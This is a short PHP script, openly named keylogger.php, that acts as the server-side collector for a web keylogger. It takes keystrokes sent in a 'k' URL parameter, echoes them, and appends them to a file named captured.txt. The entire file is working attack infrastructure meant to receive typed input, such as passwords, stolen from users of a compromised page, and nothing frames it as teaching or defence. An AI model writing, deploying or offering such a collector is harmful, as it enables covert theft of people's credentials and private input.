<?php
// keylogger.php
if(!empty($_GET['k'])) {

    $captured = urldecode($_GET['k']);

    echo 'Loggin keys :' . $captured;
    $logfile = fopen('captured.txt', 'a+');
    fwrite($logfile, $captured);
    fclose($logfile);
}
else
{
  echo 'Error parsing keys';
}
?>
